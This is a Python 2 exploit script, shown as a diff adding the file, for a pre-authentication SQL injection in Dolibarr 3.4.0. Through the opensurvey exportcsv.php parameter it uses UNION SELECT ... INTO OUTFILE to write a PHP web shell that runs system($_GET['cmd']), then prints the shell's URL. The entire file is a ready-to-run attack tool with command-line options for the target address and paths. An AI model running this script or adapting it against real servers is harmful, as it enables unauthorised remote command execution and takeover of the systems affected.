@@ -1,0 +1,56 @@
+# Exploit Title: Dolibarr 3.4.0 SQLi
+# Date: 10/7/2013
+# Exploit author: drone (@dronesec)
+# More information: http://forelsec.blogspot.com/2013/10/dolibarr-340-multiple-vulnerabilities.html
+# Vendor homepage: http://www.dolibarr.org/
+# Software link: 
+# Version: 3.4.0
+# Fixed in: 3.4.1
+# Tested on: Ubuntu 12.04 (apparmor disabled)
+
+import urllib2
+import string
+import random
+from argparse import ArgumentParser
+
+""" Preauth web shell via SQL injection
+    Dolibarr 3.4.0
+"""
+
+def run(options):
+    """ run exploit
+    """
+    print '[!] Dropping web shell on %s...' % options.ip
+    shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))
+    sqli = 'http://{0}{1}/htdocs/opensurvey/public/exportcsv.php?sondage='\
+                                            .format(options.ip, options.rootp)
+
+    # ' UNION SELECT '<?php system($_GET['cmd'])?>,2,3,[..]13 INTO OUTFILE 'yourshell';-- -
+    exploit = '\'%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20\'<?php%20system($_GET[\\\'cmd\\\'])?>\''\
+              ',2,3,4,5,6,7,8,9,10,11,12,13%20INTO%20OUTFILE%20\'{0}/{1}.php\';%20--%20-%20'\
+                        .format(options.path, shell)
+
+    try:
+        urllib2.urlopen(sqli + exploit)
+        print '[!] Shell dropped.  http://%s%s/documents/%s.php?cmd=ls' % \
+                                                    (options.ip, options.rootp, shell)
+    except Exception, e:
+        print '[-] %s' % e
+
+def parse():
+    """ Parse cli
+    """
+    parser = ArgumentParser()
+    parser.add_argument('-i', help='Server address', action='store', dest='ip', required=True)
+    parser.add_argument('-p', help='Path to Dolibarr install (/dolibarr)', action='store',
+                            default='/dolibarr', dest='rootp')
+    parser.add_argument('-w', help='Path to drop shell (/var/www/dolibarr/documents)',
+                            action='store', default='/var/www/dolibarr/documents', dest='path')
+
+    options = parser.parse_args()
+    options.path = options.path if options.path[-1] != '/' else options.path[:-1]
+    options.rootp = options.rootp if options.path[-1] != '/' else options.path[:-1]
+    return options
+
+if __name__ == "__main__":
+    run(parse())
